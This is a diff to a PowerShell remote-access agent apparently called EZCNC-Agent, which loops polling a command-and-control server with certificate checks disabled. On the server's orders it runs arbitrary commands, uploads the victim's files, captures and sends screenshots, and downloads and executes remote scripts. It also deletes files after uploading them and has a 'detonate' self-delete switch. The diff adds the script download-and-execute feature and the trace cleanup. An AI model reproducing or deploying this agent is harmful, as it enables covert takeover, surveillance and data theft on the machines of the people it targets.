@@ -24,13 +24,24 @@ v0.2
     - Modified Run Command to use "DownloadString" for "GET" instead of Invoke Web Request
     - Mofified Upload (victim to attacker) to use "UploadString" for POST request
     - Modified Screenshot to use UploadString for PUT request
+
+v0.3
+    - Fixed requests to not go to ServerRequirements, instead it's in a single directory (known by server) .. so just go to <IP>:<port> for commands. Everything will be placed in that same directory (root of 'web server'). Everything will be handled by web server
+    - Added comments
+
+v0.4
+    - Added ability to run scripts
+    - Cleaned screenshots and scripts now delete files saved to disk after uploading
+
+END COMMENTS # LEAVE THIS.. needed for config.py
 #>
 
 
-# Endless loop
+# Start Endless loop. Loop controlled by Sleep timer at the very end
 while ($true)
 { $i++
 
+# Needed for bad certificate. Probably can fix this one day
 Add-Type @"
     using System;
     using System.Net;
@@ -53,11 +64,10 @@ Add-Type @"
 
 
 # Connect to C&C, check to see if command is available (make sure it is not the same command as before)
+# Add Global Variables here
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
-#ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls13;
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $ccserver = "192.168.9.4:8080" # IP of C&C server
-#$ccserver = "10.197.27.89:4443" # IP of C&C Server
 $web = New-Object System.Net.WebClient
 $Path = $env:UserProfile + "\AppData\Local\Temp\" # Path of Temp in UserProfile
 $commandPath = $Path + "command.txt" # Command.txt of Path of temp
@@ -74,11 +84,11 @@ $PreviousCommand = [IO.File]::ReadAllText($commandPath)
 
 # Make sure C&C is online
 Try{
-$Command = $web.DownloadString("https://$ccserver/ServerRequirements/cc.js")
+$Command = $web.DownloadString("https://$ccserver/cc.js")
 Write-Output $Command
 }
 Catch{
-Write-Warning $error[0].Exception.InnerException
+#Write-Warning $error[0].Exception.InnerException
 #Write-Warning "Server is offline"
 #Write-Output $Command
 }
@@ -93,7 +103,13 @@ $Indicator = $b[0]
 #write-host Previous is: $PreviousCommand
 #write-host Indicator: $Indicator
 
-# Run Commands
+################
+## BEGIN IF/ELSE - Which is the brains of the script
+################
+
+###############
+# 1 - COMMAND
+###############
 if($Indicator -eq '1' -And $PreviousCommand -ne $CurrentCommand) {
     write-host "Found a command, running it"
     $CurrentCommand | out-file -filepath $commandPath -NoNewLine
@@ -112,18 +128,18 @@ if($Indicator -eq '1' -And $PreviousCommand -ne $CurrentCommand) {
     # Connect back to C&C and send Base64 post request
     try {
         #$respond = Invoke-WebRequest -Uri https://$ccserver/$EncodedCommand/$EncodedOutput -Method GET -UseBasicParsing -ErrorAction Stop
-        $respond = $web.DownloadString("https://$ccserver/ServerRequirements/$EncodedCommand/$EncodedOutput")
+        $respond = $web.DownloadString("https://$ccserver/$EncodedCommand/$EncodedOutput")
         # Modified the above for download string instead of webrequest
         $StatusCode = $Response.StatusCode
         }
     catch {
         $StatusCode = $_.Exception.Response.StatusCode.value__
-        Write-Warning $error[0].Exception.InnerException
+        #Write-Warning $error[0].Exception.InnerException
         }
 } 
 
 ###############
-# File Upload - Grab file from Victim and Send to Attacker
+# 2 - File Upload - Grab file from Victim and Send to Attacker
 ###############
 elseif($Indicator -eq '2' -And $PreviousCommand -ne $CurrentCommand) {
     write-host "Time to upload a file!"
@@ -135,14 +151,14 @@ elseif($Indicator -eq '2' -And $PreviousCommand -ne $CurrentCommand) {
 
     $body = "$(get-content $CurrentCommand -raw)"
     #$respond = Invoke-RestMethod -uri $ccserver -method POST -body $body -UseBasicParsing -ErrorAction Stop
-    $respond = $web.UploadString("https://$ccserver/ServerRequirements", $body)
+    $respond = $web.UploadString("https://$ccserver", $body)
     $StatusCode = $Response.StatusCode
 
     $StatusCode
 
 } 
 ###########
-## DOWNLOAD A FILE
+## 3 - DOWNLOAD A FILE FROM CNC and save to local directory
 ###########
 elseif($Indicator -eq '3' -And $PreviousCommand -ne $CurrentCommand) {
 #if($Indicator -eq '3') {
@@ -150,15 +166,14 @@ elseif($Indicator -eq '3' -And $PreviousCommand -ne $CurrentCommand) {
     $CurrentCommand | out-file -filepath $commandPath -NoNewLine
 
     # Perform Command and save to variable
-    $CommandOutput = $web.DownloadFile("https://$ccserver/Files/$CurrentCommand", $CurrentCommand)
+    $CommandOutput = $web.DownloadFile("https://$ccserver/$CurrentCommand", $CurrentCommand)
     
     # Necessary to wait for next instruction
     Start-Sleep -s 5
 
 } 
 ######
-# Take Screenshot
-# TODO: Figure out to stop loop of screenshot
+# 4 - Take Screenshot
 ######
 elseif($Indicator -eq '4' -And $PreviousCommand -ne $CurrentCommand){
     write-host "Taking screenshot..."
@@ -187,20 +202,68 @@ elseif($Indicator -eq '4' -And $PreviousCommand -ne $CurrentCommand){
 
     $base64Image = [convert]::ToBase64String((get-content $CaptureFile -encoding byte))
     #$respond = Invoke-WebRequest -uri $ccserver/screenshot1.bmp -Method PUT -Body $base64Image -ContentType "application/base64" -UseBasicParsing -ErrorAction Stop
-    $respond = $web.UploadString("https://$ccserver/Screenshots/screenshot1.bmp", "PUT", $base64Image)
+    $respond = $web.UploadString("https://$ccserver/screenshot1.bmp", "PUT", $base64Image)
     $StatusCode = $Response.StatusCode
 
     $StatusCode
     
     # Necessary to wait for next instruction
     Start-Sleep -s 5
+
+    rm $CaptureFile
 }
 ######
-# Take Screenshot
-# TODO: Figure out to stop loop of screenshot
+# 5 - RUN SCRIPTS (Download from Server, run, 
+# TODO: NEED TO INCORPORATE
 ######
 elseif($Indicator -eq '5' -And $PreviousCommand -ne $CurrentCommand){
-    write-host "Let's enumerate"
+    write-host "Let's run a script"
+    write-host "Downloading script..."
+    $CurrentCommand | out-file -filepath $commandPath -NoNewLine
+
+    # Perform Command and save to variable
+    $CommandOutput = $web.DownloadFile("https://$ccserver/$CurrentCommand", $CurrentCommand)
+    
+    # Necessary to wait for next instruction
+    Start-Sleep -s 5
+
+    # Now that the file is downloaded, run it
+    #$output = 'jaws-output.txt'
+    $script = ('.\' + $CurrentCommand)
+
+    write-host "Let's run.. " + $script
+    Invoke-Expression -Command $script 
+
+    # Sleep for 10 seconds to ensure script completes
+    write-host "Sleeping for 10.."
+    Start-Sleep -s 10
+
+    write-host "Sending output back to command server.."
+
+    # TAKEN FROM #2..
+    write-host "Time to upload a file!"
+    #$CurrentCommand | out-file -filepath $commandPath -NoNewLine
+    $ScriptOutput = "ScriptOutput.txt"
+    write-host "File to get is:" $ScriptOutput
+    $body = "$(get-content $ScriptOutput -raw)"
+    $respond = $web.UploadString("https://$ccserver", $body)
+    $StatusCode = $Response.StatusCode
+    $StatusCode
+
+    Start-Sleep -s 10
+    rm $script
+    rm $ScriptOutput
+
+
+}
+########
+# DETONATE - ENUMERATE
+# If this is triggered.. remove EZCNC-Agent.ps1 and exit the script
+#########
+elseif($Indicator -eq 'detonate' -And $PreviousCommand -ne $CurrentCommand){
+    write-host "KILL SWITCH ENABLED. GOODBYE MY LOVE...."
+    rm .\EZCNC-Agent.ps1
+    exit
 }
 #########
 # Exit
@@ -212,7 +275,10 @@ else {
 }
 
 
-# Sleep 15 seconds
+# Sleep 5 seconds
 Start-Sleep -s 5
 
 } # End infinit loop
+
+
+
